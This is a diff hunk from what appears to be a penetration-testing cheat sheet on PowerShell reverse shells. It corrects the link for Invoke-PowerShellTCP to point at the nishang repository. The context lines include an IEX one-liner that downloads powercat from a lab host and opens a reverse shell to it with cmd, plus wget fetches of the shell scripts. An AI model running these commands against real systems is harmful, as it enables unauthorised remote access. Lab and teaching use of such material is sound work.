@@ -49,7 +49,7 @@ $ wget https://raw.githubusercontent.com/besimorhino/powercat/refs/heads/master/
 IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.101/powercat.ps1'); powercat -c 192.168.56.101 -p 443 -e cmd
 ```
 ### Invoke-PowerShellTCP
-https://github.com/besimorhino/powercat
+https://github.com/samratashok/nishang
 ```
 $ cd ~/THA/
 $ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
